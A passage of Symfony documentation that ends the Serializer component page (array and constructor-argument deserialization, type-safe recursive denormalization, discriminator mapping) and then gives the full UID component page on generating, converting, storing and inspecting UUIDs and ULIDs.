    $person2 = new Person();
    $person2->setName('bar');
    $person2->setAge(33);
    $person2->setSportsman(true);

    $persons = [$person1, $person2];
    $data = $serializer->serialize($persons, 'json');

    // $data contains [{"name":"foo","age":99,"sportsman":false},{"name":"bar","age":33,"sportsman":true}]

If you want to deserialize such a structure, you need to add the
:class:`Symfony\\Component\\Serializer\\Normalizer\\ArrayDenormalizer`
to the set of normalizers. By appending ``[]`` to the type parameter of the
:method:`Symfony\\Component\\Serializer\\Serializer::deserialize` method,
you indicate that you're expecting an array instead of a single object::

    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Normalizer\ArrayDenormalizer;
    use Symfony\Component\Serializer\Normalizer\GetSetMethodNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $serializer = new Serializer(
        [new GetSetMethodNormalizer(), new ArrayDenormalizer()],
        [new JsonEncoder()]
    );

    $data = ...; // The serialized data from the previous example
    $persons = $serializer->deserialize($data, 'Acme\Person[]', 'json');

Handling Constructor Arguments
------------------------------

If the class constructor defines arguments, as usually happens with
`Value Objects`_, the serializer won't be able to create the object if some
arguments are missing. In those cases, use the ``default_constructor_arguments``
context option::

    use Symfony\Component\Serializer\Normalizer\AbstractNormalizer;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    class MyObj
    {
        public function __construct(
            private string $foo,
            private string $bar,
        ) {
        }
    }

    $normalizer = new ObjectNormalizer($classMetadataFactory);
    $serializer = new Serializer([$normalizer]);

    $data = $serializer->denormalize(
        ['foo' => 'Hello'],
        'MyObj',
        null,
        [AbstractNormalizer::DEFAULT_CONSTRUCTOR_ARGUMENTS => [
            'MyObj' => ['foo' => '', 'bar' => ''],
        ]]
    );
    // $data = new MyObj('Hello', '');

Recursive Denormalization and Type Safety
-----------------------------------------

The Serializer component can use the :doc:`PropertyInfo Component </components/property_info>` to denormalize
complex types (objects). The type of the class' property will be guessed using the provided
extractor and used to recursively denormalize the inner data.

When using this component in a Symfony application, all normalizers are automatically configured to use the registered extractors.
When using the component standalone, an implementation of :class:`Symfony\\Component\\PropertyInfo\\PropertyTypeExtractorInterface`,
(usually an instance of :class:`Symfony\\Component\\PropertyInfo\\PropertyInfoExtractor`) must be passed as the 4th
parameter of the ``ObjectNormalizer``::

    namespace Acme;

    use Symfony\Component\PropertyInfo\Extractor\ReflectionExtractor;
    use Symfony\Component\Serializer\Normalizer\DateTimeNormalizer;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    class ObjectOuter
    {
        private ObjectInner $inner;
        private \DateTimeInterface $date;

        public function getInner(): ObjectInner
        {
            return $this->inner;
        }

        public function setInner(ObjectInner $inner): void
        {
            $this->inner = $inner;
        }

        public function getDate(): \DateTimeInterface
        {
            return $this->date;
        }

        public function setDate(\DateTimeInterface $date): void
        {
            $this->date = $date;
        }
    }

    class ObjectInner
    {
        public string $foo;
        public string $bar;
    }

    $normalizer = new ObjectNormalizer(null, null, null, new ReflectionExtractor());
    $serializer = new Serializer([new DateTimeNormalizer(), $normalizer]);

    $obj = $serializer->denormalize(
        ['inner' => ['foo' => 'foo', 'bar' => 'bar'], 'date' => '1988/01/21'],
        'Acme\ObjectOuter'
    );

    dump($obj->getInner()->foo); // 'foo'
    dump($obj->getInner()->bar); // 'bar'
    dump($obj->getDate()->format('Y-m-d')); // '1988-01-21'

When a ``PropertyTypeExtractor`` is available, the normalizer will also check that the data to denormalize
matches the type of the property (even for primitive types). For instance, if a ``string`` is provided, but
the type of the property is ``int``, an :class:`Symfony\\Component\\Serializer\\Exception\\UnexpectedValueException`
will be thrown. The type enforcement of the properties can be disabled by setting
the serializer context option ``ObjectNormalizer::DISABLE_TYPE_ENFORCEMENT``
to ``true``.

.. _serializer_interfaces-and-abstract-classes:

Serializing Interfaces and Abstract Classes
-------------------------------------------

When dealing with objects that are fairly similar or share properties, you may
use interfaces or abstract classes. The Serializer component allows you to
serialize and deserialize these objects using a *"discriminator class mapping"*.

The discriminator is the field (in the serialized string) used to differentiate
between the possible objects. In practice, when using the Serializer component,
pass a :class:`Symfony\\Component\\Serializer\\Mapping\\ClassDiscriminatorResolverInterface`
implementation to the :class:`Symfony\\Component\\Serializer\\Normalizer\\ObjectNormalizer`.

The Serializer component provides an implementation of ``ClassDiscriminatorResolverInterface``
called :class:`Symfony\\Component\\Serializer\\Mapping\\ClassDiscriminatorFromClassMetadata`
which uses the class metadata factory and a mapping configuration to serialize
and deserialize objects of the correct class.

When using this component inside a Symfony application and the class metadata factory is enabled
as explained in the :ref:`Attributes Groups section <component-serializer-attributes-groups>`,
this is already set up and you only need to provide the configuration. Otherwise::

    // ...
    use Symfony\Component\Serializer\Encoder\JsonEncoder;
    use Symfony\Component\Serializer\Mapping\ClassDiscriminatorFromClassMetadata;
    use Symfony\Component\Serializer\Mapping\ClassDiscriminatorMapping;
    use Symfony\Component\Serializer\Normalizer\ObjectNormalizer;
    use Symfony\Component\Serializer\Serializer;

    $classMetadataFactory = new ClassMetadataFactory(new AttributeLoader());

    $discriminator = new ClassDiscriminatorFromClassMetadata($classMetadataFactory);

    $serializer = new Serializer(
        [new ObjectNormalizer($classMetadataFactory, null, null, null, $discriminator)],
        ['json' => new JsonEncoder()]
    );

Now configure your discriminator class mapping. Consider an application that
defines an abstract ``CodeRepository`` class extended by ``GitHubCodeRepository``
and ``BitBucketCodeRepository`` classes:

.. configuration-block::

    .. code-block:: php-attributes

        namespace App;

        use App\BitBucketCodeRepository;
        use App\GitHubCodeRepository;
        use Symfony\Component\Serializer\Annotation\DiscriminatorMap;

        #[DiscriminatorMap(typeProperty: 'type', mapping: [
            'github' => GitHubCodeRepository::class,
            'bitbucket' => BitBucketCodeRepository::class,
        ])]
        abstract class CodeRepository
        {
            // ...
        }

    .. code-block:: yaml

        App\CodeRepository:
            discriminator_map:
                type_property: type
                mapping:
                    github: 'App\GitHubCodeRepository'
                    bitbucket: 'App\BitBucketCodeRepository'

    .. code-block:: xml

        <?xml version="1.0" encoding="UTF-8" ?>
        <serializer xmlns="http://symfony.com/schema/dic/serializer-mapping"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/serializer-mapping
                https://symfony.com/schema/dic/serializer-mapping/serializer-mapping-1.0.xsd"
        >
            <class name="App\CodeRepository">
                <discriminator-map type-property="type">
                    <mapping type="github" class="App\GitHubCodeRepository"/>
                    <mapping type="bitbucket" class="App\BitBucketCodeRepository"/>
                </discriminator-map>
            </class>
        </serializer>

.. note::

    The values of the ``mapping`` array option must be strings.
    Otherwise, they will be cast into strings automatically.

Once configured, the serializer uses the mapping to pick the correct class::

    $serialized = $serializer->serialize(new GitHubCodeRepository(), 'json');
    // {"type": "github"}

    $repository = $serializer->deserialize($serialized, CodeRepository::class, 'json');
    // instanceof GitHubCodeRepository

Learn more
----------

.. toctree::
    :maxdepth: 1
    :glob:

    /serializer

.. seealso::

    Normalizers for the Symfony Serializer Component supporting popular web API formats
    (JSON-LD, GraphQL, OpenAPI, HAL, JSON:API) are available as part of the `API Platform`_ project.

.. seealso::

    A popular alternative to the Symfony Serializer component is the third-party
    library, `JMS serializer`_ (versions before ``v1.12.0`` were released under
    the Apache license, so incompatible with GPLv2 projects).

.. _`PSR-1 standard`: https://www.php-fig.org/psr/psr-1/
.. _`JMS serializer`: https://github.com/schmittjoh/serializer
.. _RFC3339: https://tools.ietf.org/html/rfc3339#section-5.8
.. _`options with libxml`: https://www.php.net/manual/en/libxml.constants.php
.. _`DOM XML_* constants`: https://www.php.net/manual/en/dom.constants.php
.. _JSON: https://www.json.org/json-en.html
.. _XML: https://www.w3.org/XML/
.. _YAML: https://yaml.org/
.. _CSV: https://tools.ietf.org/html/rfc4180
.. _`RFC 7807`: https://tools.ietf.org/html/rfc7807
.. _`UTF-8 BOM`: https://en.wikipedia.org/wiki/Byte_order_mark
.. _`Value Objects`: https://en.wikipedia.org/wiki/Value_object
.. _`API Platform`: https://api-platform.com
.. _`list of PHP timezones`: https://www.php.net/manual/en/timezones.php
.. _`RFC 4122`: https://tools.ietf.org/html/rfc4122
.. _`PHP reflection`: https://php.net/manual/en/book.reflection.php
.. _`data URI`: https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs
.. _seld/jsonlint: https://github.com/Seldaek/jsonlint
.. _$flags: https://www.php.net/manual/en/json.constants.php
The UID Component
=================

    The UID component provides utilities to work with `unique identifiers`_ (UIDs)
    such as UUIDs and ULIDs.

Installation
------------

.. code-block:: terminal

    $ composer require symfony/uid

.. include:: /components/require_autoload.rst.inc

.. _uuid:

UUIDs
-----

`UUIDs`_ (*universally unique identifiers*) are one of the most popular UIDs in
the software industry. UUIDs are 128-bit numbers usually represented as five
groups of hexadecimal characters: ``xxxxxxxx-xxxx-Mxxx-Nxxx-xxxxxxxxxxxx``
(the ``M`` digit is the UUID version and the ``N`` digit is the UUID variant).

Generating UUIDs
~~~~~~~~~~~~~~~~

Use the named constructors of the ``Uuid`` class or any of the specific classes
to create each type of UUID:

**UUID v1** (time-based)

Generates the UUID using a timestamp and the MAC address of your device
(`read UUIDv1 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-1>`__).
Both are obtained automatically, so you don't have to pass any constructor argument::

    use Symfony\Component\Uid\Uuid;

    // $uuid is an instance of Symfony\Component\Uid\UuidV1
    $uuid = Uuid::v1();

.. tip::

    It's recommended to use UUIDv7 instead of UUIDv1 because it provides
    better entropy.

**UUID v2** (DCE security)

Similar to UUIDv1 but with a very high likelihood of ID collision
(`read UUIDv2 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-2>`__).
It's part of the authentication mechanism of DCE (Distributed Computing Environment)
and the UUID includes the POSIX UIDs (user/group ID) of the user who generated it.
This UUID variant is **not implemented** by the Uid component.

**UUID v3** (name-based, MD5)

Generates UUIDs from names that belong, and are unique within, some given namespace
(`read UUIDv3 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-3>`__).
This variant is useful to generate deterministic UUIDs from arbitrary strings.
It works by populating the UUID contents with the``md5`` hash of concatenating
the namespace and the name::

    use Symfony\Component\Uid\Uuid;

    // you can use any of the predefined namespaces...
    $namespace = Uuid::fromString(Uuid::NAMESPACE_OID);
    // ...or use a random namespace:
    // $namespace = Uuid::v4();

    // $name can be any arbitrary string
    // $uuid is an instance of Symfony\Component\Uid\UuidV3
    $uuid = Uuid::v3($namespace, $name);

These are the default namespaces defined by the standard:

* ``Uuid::NAMESPACE_DNS`` if you are generating UUIDs for `DNS entries <https://en.wikipedia.org/wiki/Domain_Name_System>`__
* ``Uuid::NAMESPACE_URL`` if you are generating UUIDs for `URLs <https://en.wikipedia.org/wiki/URL>`__
* ``Uuid::NAMESPACE_OID`` if you are generating UUIDs for `OIDs (object identifiers) <https://en.wikipedia.org/wiki/Object_identifier>`__
* ``Uuid::NAMESPACE_X500`` if you are generating UUIDs for `X500 DNs (distinguished names) <https://en.wikipedia.org/wiki/X.500>`__

**UUID v4** (random)

Generates a random UUID (`read UUIDv4 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-4>`__).
Because of its randomness, it ensures uniqueness across distributed systems
without the need for a central coordinating entity. It's privacy-friendly
because it doesn't contain any information about where and when it was generated::

    use Symfony\Component\Uid\Uuid;

    // $uuid is an instance of Symfony\Component\Uid\UuidV4
    $uuid = Uuid::v4();

**UUID v5** (name-based, SHA-1)

It's the same as UUIDv3 (explained above) but it uses ``sha1`` instead of
``md5`` to hash the given namespace and name (`read UUIDv5 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-5>`__).
This makes it more secure and less prone to hash collisions.

.. _uid-uuid-v6:

**UUID v6** (reordered time-based)

It rearranges the time-based fields of the UUIDv1 to make it lexicographically
sortable (like :ref:`ULIDs <ulid>`). It's more efficient for database indexing
(`read UUIDv6 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-6>`__)::

    use Symfony\Component\Uid\Uuid;

    // $uuid is an instance of Symfony\Component\Uid\UuidV6
    $uuid = Uuid::v6();

.. tip::

    It's recommended to use UUIDv7 instead of UUIDv6 because it provides
    better entropy.

.. _uid-uuid-v7:

**UUID v7** (UNIX timestamp)

Generates time-ordered UUIDs based on a high-resolution Unix Epoch timestamp
source (the number of milliseconds since midnight 1 Jan 1970 UTC, leap seconds excluded)
(`read UUIDv7 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-7>`__).
It's recommended to use this version over UUIDv1 and UUIDv6 because it provides
better entropy (and a more strict chronological order of UUID generation)::

    use Symfony\Component\Uid\Uuid;

    // $uuid is an instance of Symfony\Component\Uid\UuidV7
    $uuid = Uuid::v7();

**UUID v8** (custom)

Provides an RFC-compatible format for experimental or vendor-specific use cases
(`read UUIDv8 spec <https://datatracker.ietf.org/doc/html/draft-ietf-uuidrev-rfc4122bis#name-uuid-version-8>`__).
The only requirement is to set the variant and version bits of the UUID. The rest
of the UUID value is specific to each implementation and no format should be assumed::

    use Symfony\Component\Uid\Uuid;

    // $uuid is an instance of Symfony\Component\Uid\UuidV8
    $uuid = Uuid::v8();

If your UUID value is already generated in another format, use any of the
following methods to create a ``Uuid`` object from it::

    // all the following examples would generate the same Uuid object
    $uuid = Uuid::fromString('d9e7a184-5d5b-11ea-a62a-3499710062d0');
    $uuid = Uuid::fromBinary("\xd9\xe7\xa1\x84\x5d\x5b\x11\xea\xa6\x2a\x34\x99\x71\x00\x62\xd0");
    $uuid = Uuid::fromBase32('6SWYGR8QAV27NACAHMK5RG0RPG');
    $uuid = Uuid::fromBase58('TuetYWNHhmuSQ3xPoVLv9M');
    $uuid = Uuid::fromRfc4122('d9e7a184-5d5b-11ea-a62a-3499710062d0');

You can also use the ``UuidFactory`` to generate UUIDs. First, you may
configure the behavior of the factory using configuration files::

.. configuration-block::

    .. code-block:: yaml

        # config/packages/uid.yaml
        framework:
            uid:
                default_uuid_version: 7
                name_based_uuid_version: 5
                name_based_uuid_namespace: 6ba7b810-9dad-11d1-80b4-00c04fd430c8
                time_based_uuid_version: 7
                time_based_uuid_node: 121212121212

    .. code-block:: xml

        <!-- config/packages/uid.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xmlns:framework="http://symfony.com/schema/dic/symfony"
                   xsi:schemaLocation="http://symfony.com/schema/dic/services
                        https://symfony.com/schema/dic/services/services-1.0.xsd
                        http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd">

            <framework:config>
                <framework:uid
                    default_uuid_version="7"
                    name_based_uuid_version="5"
                    name_based_uuid_namespace="6ba7b810-9dad-11d1-80b4-00c04fd430c8"
                    time_based_uuid_version="7"
                    time_based_uuid_node="121212121212"
                />
            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/uid.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        return static function (ContainerConfigurator $container): void {
            $services = $container->services()
                ->defaults()
                ->autowire()
                ->autoconfigure();

            $container->extension('framework', [
                'uid' => [
                    'default_uuid_version' => 7,
                    'name_based_uuid_version' => 5,
                    'name_based_uuid_namespace' => '6ba7b810-9dad-11d1-80b4-00c04fd430c8',
                    'time_based_uuid_version' => 7,
                    'time_based_uuid_node' => 121212121212,
                ],
            ]);
        };

Then, you can inject the factory in your services and use it to generate UUIDs based
on the configuration you defined::

    namespace App\Service;

    use Symfony\Component\Uid\Factory\UuidFactory;

    class FooService
    {
        public function __construct(
            private UuidFactory $uuidFactory,
        ) {
        }

        public function generate(): void
        {
            // This creates a UUID of the version given in the configuration file (v7 by default)
            $uuid = $this->uuidFactory->create();

            $nameBasedUuid = $this->uuidFactory->nameBased(/** ... */);
            $randomBasedUuid = $this->uuidFactory->randomBased();
            $timestampBased = $this->uuidFactory->timeBased();

            // ...
        }
    }

Converting UUIDs
~~~~~~~~~~~~~~~~

Use these methods to transform the UUID object into different bases::

    $uuid = Uuid::fromString('d9e7a184-5d5b-11ea-a62a-3499710062d0');

    $uuid->toBinary();  // string(16) "\xd9\xe7\xa1\x84\x5d\x5b\x11\xea\xa6\x2a\x34\x99\x71\x00\x62\xd0"
    $uuid->toBase32();  // string(26) "6SWYGR8QAV27NACAHMK5RG0RPG"
    $uuid->toBase58();  // string(22) "TuetYWNHhmuSQ3xPoVLv9M"
    $uuid->toRfc4122(); // string(36) "d9e7a184-5d5b-11ea-a62a-3499710062d0"
    $uuid->toHex();     // string(34) "0xd9e7a1845d5b11eaa62a3499710062d0"
    $uuid->toString();  // string(36) "d9e7a184-5d5b-11ea-a62a-3499710062d0"

.. versionadded:: 7.1

    The ``toString()`` method was introduced in Symfony 7.1.

You can also convert some UUID versions to others::

    // convert V1 to V6 or V7
    $uuid = Uuid::v1();

    $uuid->toV6(); // returns a Symfony\Component\Uid\UuidV6 instance
    $uuid->toV7(); // returns a Symfony\Component\Uid\UuidV7 instance

    // convert V6 to V7
    $uuid = Uuid::v6();

    $uuid->toV7(); // returns a Symfony\Component\Uid\UuidV7 instance

.. versionadded:: 7.1

    The :method:`Symfony\\Component\\Uid\\UuidV1::toV6`,
    :method:`Symfony\\Component\\Uid\\UuidV1::toV7` and
    :method:`Symfony\\Component\\Uid\\UuidV6::toV7`
    methods were introduced in Symfony 7.1.

Working with UUIDs
~~~~~~~~~~~~~~~~~~

UUID objects created with the ``Uuid`` class can use the following methods
(which are equivalent to the ``uuid_*()`` method of the PHP extension)::

    use Symfony\Component\Uid\NilUuid;
    use Symfony\Component\Uid\Uuid;

    // checking if the UUID is null (note that the class is called
    // NilUuid instead of NullUuid to follow the UUID standard notation)
    $uuid = Uuid::v4();
    $uuid instanceof NilUuid; // false

    // checking the type of UUID
    use Symfony\Component\Uid\UuidV4;
    $uuid = Uuid::v4();
    $uuid instanceof UuidV4; // true

    // getting the UUID datetime (it's only available in certain UUID types)
    $uuid = Uuid::v1();
    $uuid->getDateTime(); // returns a \DateTimeImmutable instance

    // checking if a given value is valid as UUID
    $isValid = Uuid::isValid($uuid); // true or false

    // comparing UUIDs and checking for equality
    $uuid1 = Uuid::v1();
    $uuid4 = Uuid::v4();
    $uuid1->equals($uuid4); // false

    // this method returns:
    //   * int(0) if $uuid1 and $uuid4 are equal
    //   * int > 0 if $uuid1 is greater than $uuid4
    //   * int < 0 if $uuid1 is less than $uuid4
    $uuid1->compare($uuid4); // e.g. int(4)

Storing UUIDs in Databases
~~~~~~~~~~~~~~~~~~~~~~~~~~

If you :doc:`use Doctrine </doctrine>`, consider using the ``uuid`` Doctrine
type, which converts to/from UUID objects automatically::

    // src/Entity/Product.php
    namespace App\Entity;

    use Doctrine\ORM\Mapping as ORM;
    use Symfony\Bridge\Doctrine\Types\UuidType;
    use Symfony\Component\Uid\Uuid;

    #[ORM\Entity(repositoryClass: ProductRepository::class)]
    class Product
    {
        #[ORM\Column(type: UuidType::NAME)]
        private Uuid $someProperty;

        // ...
    }

There's also a Doctrine generator to help auto-generate UUID values for the
entity primary keys::

    namespace App\Entity;

    use Doctrine\ORM\Mapping as ORM;
    use Symfony\Bridge\Doctrine\Types\UuidType;
    use Symfony\Component\Uid\Uuid;

    class User implements UserInterface
    {
        #[ORM\Id]
        #[ORM\Column(type: UuidType::NAME, unique: true)]
        #[ORM\GeneratedValue(strategy: 'CUSTOM')]
        #[ORM\CustomIdGenerator(class: 'doctrine.uuid_generator')]
        private ?Uuid $id;

        public function getId(): ?Uuid
        {
            return $this->id;
        }

        // ...
    }

.. caution::

    Using UUIDs as primary keys is usually not recommended for performance reasons:
    indexes are slower and take more space (because UUIDs in binary format take
    128 bits instead of 32/64 bits for auto-incremental integers) and the non-sequential
    nature of UUIDs fragments indexes. :ref:`UUID v6 <uid-uuid-v6>` and :ref:`UUID v7 <uid-uuid-v7>`
    are the only variants that solve the fragmentation issue (but the index size issue remains).

When using built-in Doctrine repository methods (e.g. ``findOneBy()``), Doctrine
knows how to convert these UUID types to build the SQL query
(e.g. ``->findOneBy(['user' => $user->getUuid()])``). However, when using DQL
queries or building the query yourself, you'll need to set ``uuid`` as the type
of the UUID parameters::

    // src/Repository/ProductRepository.php

    // ...
    use Doctrine\DBAL\ParameterType;
    use Symfony\Bridge\Doctrine\Types\UuidType;

    class ProductRepository extends ServiceEntityRepository
    {
        // ...

        public function findUserProducts(User $user): array
        {
            $qb = $this->createQueryBuilder('p')
                // ...
                // add UuidType::NAME as the third argument to tell Doctrine that this is a UUID
                ->setParameter('user', $user->getUuid(), UuidType::NAME)

                // alternatively, you can convert it to a value compatible with
                // the type inferred by Doctrine
                ->setParameter('user', $user->getUuid()->toBinary(), ParameterType::BINARY)
            ;

            // ...
        }
    }

.. _ulid:

ULIDs
-----

`ULIDs`_ (*Universally Unique Lexicographically Sortable Identifier*) are 128-bit
numbers usually represented as a 26-character string: ``TTTTTTTTTTRRRRRRRRRRRRRRRR``
(where ``T`` represents a timestamp and ``R`` represents the random bits).

ULIDs are an alternative to UUIDs when using those is impractical. They provide
128-bit compatibility with UUID, they are lexicographically sortable and they
are encoded as 26-character strings (vs 36-character UUIDs).

.. note::

    If you generate more than one ULID during the same millisecond in the
    same process then the random portion is incremented by one bit in order
    to provide monotonicity for sorting. The random portion is not random
    compared to the previous ULID in this case.

Generating ULIDs
~~~~~~~~~~~~~~~~

Instantiate the ``Ulid`` class to generate a random ULID value::

    use Symfony\Component\Uid\Ulid;

    $ulid = new Ulid();  // e.g. 01AN4Z07BY79KA1307SR9X4MV3

If your ULID value is already generated in another format, use any of the
following methods to create a ``Ulid`` object from it::

    // all the following examples would generate the same Ulid object
    $ulid = Ulid::fromString('01E439TP9XJZ9RPFH3T1PYBCR8');
    $ulid = Ulid::fromBinary("\x01\x71\x06\x9d\x59\x3d\x97\xd3\x8b\x3e\x23\xd0\x6d\xe5\xb3\x08");
    $ulid = Ulid::fromBase32('01E439TP9XJZ9RPFH3T1PYBCR8');
    $ulid = Ulid::fromBase58('1BKocMc5BnrVcuq2ti4Eqm');
    $ulid = Ulid::fromRfc4122('0171069d-593d-97d3-8b3e-23d06de5b308');

Like UUIDs, ULIDs have their own factory, ``UlidFactory``, that can be used to generate them::

    namespace App\Service;

    use Symfony\Component\Uid\Factory\UlidFactory;

    class FooService
    {
        public function __construct(
            private UlidFactory $ulidFactory,
        ) {
        }

        public function generate(): void
        {
            $ulid = $this->ulidFactory->create();

            // ...
        }
    }

There's also a special ``NilUlid`` class to represent ULID ``null`` values::

    use Symfony\Component\Uid\NilUlid;

    $ulid = new NilUlid();
    // equivalent to $ulid = new Ulid('00000000000000000000000000');

Converting ULIDs
~~~~~~~~~~~~~~~~

Use these methods to transform the ULID object into different bases::

    $ulid = Ulid::fromString('01E439TP9XJZ9RPFH3T1PYBCR8');

    $ulid->toBinary();  // string(16) "\x01\x71\x06\x9d\x59\x3d\x97\xd3\x8b\x3e\x23\xd0\x6d\xe5\xb3\x08"
    $ulid->toBase32();  // string(26) "01E439TP9XJZ9RPFH3T1PYBCR8"
    $ulid->toBase58();  // string(22) "1BKocMc5BnrVcuq2ti4Eqm"
    $ulid->toRfc4122(); // string(36) "0171069d-593d-97d3-8b3e-23d06de5b308"
    $ulid->toHex();     // string(34) "0x0171069d593d97d38b3e23d06de5b308"

Working with ULIDs
~~~~~~~~~~~~~~~~~~

ULID objects created with the ``Ulid`` class can use the following methods::

    use Symfony\Component\Uid\Ulid;

    $ulid1 = new Ulid();
    $ulid2 = new Ulid();

    // checking if a given value is valid as ULID
    $isValid = Ulid::isValid($ulidValue); // true or false

    // getting the ULID datetime
    $ulid1->getDateTime(); // returns a \DateTimeImmutable instance

    // comparing ULIDs and checking for equality
    $ulid1->equals($ulid2); // false
    // this method returns $ulid1 <=> $ulid2
    $ulid1->compare($ulid2); // e.g. int(-1)

Storing ULIDs in Databases
~~~~~~~~~~~~~~~~~~~~~~~~~~

If you :doc:`use Doctrine </doctrine>`, consider using the ``ulid`` Doctrine
type, which converts to/from ULID objects automatically::

    // src/Entity/Product.php
    namespace App\Entity;

    use Doctrine\ORM\Mapping as ORM;
    use Symfony\Bridge\Doctrine\Types\UlidType;
    use Symfony\Component\Uid\Ulid;

    #[ORM\Entity(repositoryClass: ProductRepository::class)]
    class Product
    {
        #[ORM\Column(type: UlidType::NAME)]
        private Ulid $someProperty;

        // ...
    }

There's also a Doctrine generator to help auto-generate ULID values for the
entity primary keys::

    namespace App\Entity;

    use Doctrine\ORM\Mapping as ORM;
    use Symfony\Bridge\Doctrine\Types\UlidType;
    use Symfony\Component\Uid\Ulid;

    class Product
    {
        #[ORM\Id]
        #[ORM\Column(type: UlidType::NAME, unique: true)]
        #[ORM\GeneratedValue(strategy: 'CUSTOM')]
        #[ORM\CustomIdGenerator(class: 'doctrine.ulid_generator')]
        private ?Ulid $id;

        public function getId(): ?Ulid
        {
            return $this->id;
        }

        // ...
    }

.. caution::

    Using ULIDs as primary keys is usually not recommended for performance reasons.
    Although ULIDs don't suffer from index fragmentation issues (because the values
    are sequential), their indexes are slower and take more space (because ULIDs
    in binary format take 128 bits instead of 32/64 bits for auto-incremental integers).

When using built-in Doctrine repository methods (e.g. ``findOneBy()``), Doctrine
knows how to convert these ULID types to build the SQL query
(e.g. ``->findOneBy(['user' => $user->getUlid()])``). However, when using DQL
queries or building the query yourself, you'll need to set ``ulid`` as the type
of the ULID parameters::

    // src/Repository/ProductRepository.php

    // ...
    use Symfony\Bridge\Doctrine\Types\UlidType;

    class ProductRepository extends ServiceEntityRepository
    {
        // ...

        public function findUserProducts(User $user): array
        {
            $qb = $this->createQueryBuilder('p')
                // ...
                // add UlidType::NAME as the third argument to tell Doctrine that this is a ULID
                ->setParameter('user', $user->getUlid(), UlidType::NAME)

                // alternatively, you can convert it to a value compatible with
                // the type inferred by Doctrine
                ->setParameter('user', $user->getUlid()->toBinary())
            ;

            // ...
        }
    }

Generating and Inspecting UUIDs/ULIDs in the Console
----------------------------------------------------

This component provides several commands to generate and inspect UUIDs/ULIDs in
the console. They are not enabled by default, so you must add the following
configuration in your application before using these commands:

.. configuration-block::

    .. code-block:: yaml

        # config/services.yaml
        services:
            Symfony\Component\Uid\Command\GenerateUlidCommand: ~
            Symfony\Component\Uid\Command\GenerateUuidCommand: ~
            Symfony\Component\Uid\Command\InspectUlidCommand: ~
            Symfony\Component\Uid\Command\InspectUuidCommand: ~

    .. code-block:: xml

        <!-- config/services.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xsi:schemaLocation="http://symfony.com/schema/dic/services
                https://symfony.com/schema/dic/services/services-1.0.xsd">

            <services>
                <!-- ... -->

                <service id="Symfony\Component\Uid\Command\GenerateUlidCommand"/>
                <service id="Symfony\Component\Uid\Command\GenerateUuidCommand"/>
                <service id="Symfony\Component\Uid\Command\InspectUlidCommand"/>
                <service id="Symfony\Component\Uid\Command\InspectUuidCommand"/>
            </services>
        </container>

    .. code-block:: php

        // config/services.php
        namespace Symfony\Component\DependencyInjection\Loader\Configurator;

        use Symfony\Component\Uid\Command\GenerateUlidCommand;
        use Symfony\Component\Uid\Command\GenerateUuidCommand;
        use Symfony\Component\Uid\Command\InspectUlidCommand;
        use Symfony\Component\Uid\Command\InspectUuidCommand;

        return static function (ContainerConfigurator $container): void {
            // ...

            $services
                ->set(GenerateUlidCommand::class)
                ->set(GenerateUuidCommand::class)
                ->set(InspectUlidCommand::class)
                ->set(InspectUuidCommand::class);
        };

Now you can generate UUIDs/ULIDs as follows (add the ``--help`` option to the
commands to learn about all their options):

.. code-block:: terminal

    # generate 1 random-based UUID
    $ php bin/console uuid:generate --random-based

    # generate 1 time-based UUID with a specific node
    $ php bin/console uuid:generate --time-based=now --node=fb3502dc-137e-4849-8886-ac90d07f64a7

    # generate 2 UUIDs and output them in base58 format
    $ php bin/console uuid:generate --count=2 --format=base58

    # generate 1 ULID with the current time as the timestamp
    $ php bin/console ulid:generate

    # generate 1 ULID with a specific timestamp
    $ php bin/console ulid:generate --time="2021-02-02 14:00:00"

    # generate 2 ULIDs and output them in RFC4122 format
    $ php bin/console ulid:generate --count=2 --format=rfc4122

In addition to generating new UIDs, you can also inspect them with the following
commands to show all the information for a given UID:

.. code-block:: terminal

    $ php bin/console uuid:inspect d0a3a023-f515-4fe0-915c-575e63693998
     ---------------------- --------------------------------------
      Label                  Value
     ---------------------- --------------------------------------
      Version                4
      Canonical (RFC 4122)   d0a3a023-f515-4fe0-915c-575e63693998
      Base 58                SmHvuofV4GCF7QW543rDD9
      Base 32                6GMEG27X8N9ZG92Q2QBSHPJECR
     ---------------------- --------------------------------------

    $ php bin/console ulid:inspect 01F2TTCSYK1PDRH73Z41BN1C4X
     --------------------- --------------------------------------
      Label                 Value
     --------------------- --------------------------------------
      Canonical (Base 32)   01F2TTCSYK1PDRH73Z41BN1C4X
      Base 58               1BYGm16jS4kX3VYCysKKq6
      RFC 4122              0178b5a6-67d3-0d9b-889c-7f205750b09d
     --------------------- --------------------------------------
      Timestamp             2021-04-09 08:01:24.947
     --------------------- --------------------------------------

.. _`unique identifiers`: https://en.wikipedia.org/wiki/UID
.. _`UUIDs`: https://en.wikipedia.org/wiki/Universally_unique_identifier
.. _`ULIDs`: https://github.com/ulid/spec
